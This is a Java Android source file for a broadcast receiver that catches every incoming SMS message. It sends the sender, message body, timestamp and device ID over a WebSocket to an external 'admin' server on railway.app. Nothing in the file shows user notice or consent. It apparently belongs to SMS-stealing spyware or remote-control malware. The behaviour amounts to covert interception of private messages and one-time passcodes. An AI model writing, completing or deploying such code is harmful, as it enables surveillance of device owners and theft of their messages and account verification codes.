package com.remote.devices;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.gson.Gson;

import java.util.Collections;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            // ... (code to extract SMS remains the same)
            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (msgs != null && msgs.length > 0) {
                // ...
                SmsData newSms = new SmsData(msgs[0].getOriginatingAddress(), msgs[0].getMessageBody(), "in", msgs[0].getTimestampMillis());
                sendSmsToServer(context, newSms);
            }
        }
    }

    private void sendSmsToServer(Context context, SmsData smsData) {
        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        SmsHistory history = new SmsHistory(deviceId, Collections.singletonList(smsData));
        String jsonPayload = new Gson().toJson(history);

        OkHttpClient client = new OkHttpClient();
        // Updated to your live Render WebSocket URL
        Request request = new Request.Builder().url("https://bengal-tiger-admin-production.up.railway.app/").build();
        
        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                webSocket.send(jsonPayload);
                webSocket.close(1000, "Message sent");
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
                Log.e(TAG, "Failed to send new SMS to server via temporary socket", t);
                 // Here you would implement the "Store and Forward" logic
            }
        });
    }
}
